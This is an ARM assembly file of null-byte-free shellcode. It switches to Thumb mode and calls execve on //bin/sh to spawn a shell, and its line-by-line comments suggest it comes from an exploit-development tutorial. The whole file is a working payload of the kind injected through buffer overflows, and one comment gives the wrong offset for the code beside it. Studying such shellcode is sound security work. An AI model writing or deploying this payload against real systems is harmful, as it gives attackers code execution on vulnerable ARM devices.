.section .text
.global _start
_start:
    .code 32              //
    add     r3, pc, #1    // This whole section is for "Thumb Mode"
    bx      r3            //
    .code 16              //

    mov     r0, pc        // We place the address of pc in r0
    add     r0, #14       // and add 10 to it (which then makes it point to //bin/sh)
    sub     r2, r2, r2    // need zero to create null byte 
    //sub     r2, r2, r2    // need zero to create null byte 
    str     r2, [r0, #8]   // null byte
    str     r0, [sp, #4]  // we place it on the stack  (in case we need it again)

    add     r1, sp, #4    // we move what was on the stack to r1

    sub     r2, r2, r2    // we subtract r2 from itself (which is the same as placing 0 in r2)

    mov     r7, #11       // syscall execve in r7
    svc     1             // we execute

.ascii "//bin/sh"
.ascii "\x00\x00\x00\x00"
